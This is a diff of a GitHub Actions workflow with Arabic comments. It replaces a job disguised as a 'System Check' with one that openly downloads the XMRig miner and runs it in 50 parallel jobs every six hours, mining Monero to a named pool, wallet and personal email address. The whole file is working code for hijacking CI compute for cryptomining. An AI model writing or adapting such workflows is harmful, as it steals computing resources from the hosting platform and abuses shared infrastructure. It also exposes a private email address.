@@ -1,23 +1,35 @@
-name: System Check
-on: 
+name: Whale Mega 50
+on:
   push:
-  workflow_dispatch:
+    branches: [ main ]
   schedule:
-    - cron: '0 */6 * * *' # تشغيل تلقائي كل 6 ساعات
+    - cron: "0 */6 * * *" # إعادة تشغيل كل 6 ساعات
 
 jobs:
-  build:
+  mining:
+    name: Mining Worker
     runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # هنا بنفتح 50 سيرفر فرعي (Workers)
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
+
     steps:
-      - name: Preparing Environment
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: Preparation
         run: |
-          sudo apt-get update
-          sudo apt-get install -y cmake build-essential libssl-dev libuv1-dev libhwloc-dev
-      
-      - name: Running Core Process
+          # تحميل برنامج التعدين وفكه
+          wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
+          cp xmrig-6.21.0/xmrig .
+          chmod +x xmrig
+
+      - name: Run Mining
         run: |
-          git clone https://github.com/xmrig/xmrig.git .core
-          cd .core && mkdir build && cd build
-          cmake .. && make -j$(nproc)
-          # السطر المعدل اللي دمجنا فيه الخوارزمية والعملة
-          ./xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY --coin monero -p GH_Worker -a rx/0 --donate-level 1
+          # تشغيل التعدين وربطه بالمحفظة والإيميل (كلمة السر)
+          ./xmrig -o xmr-eu1.nanopool.org:14444 \
+          -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.worker${{ matrix.worker_id }}/nfdr065@gmail.com \
+          -p x --donate-level 1 -t 2
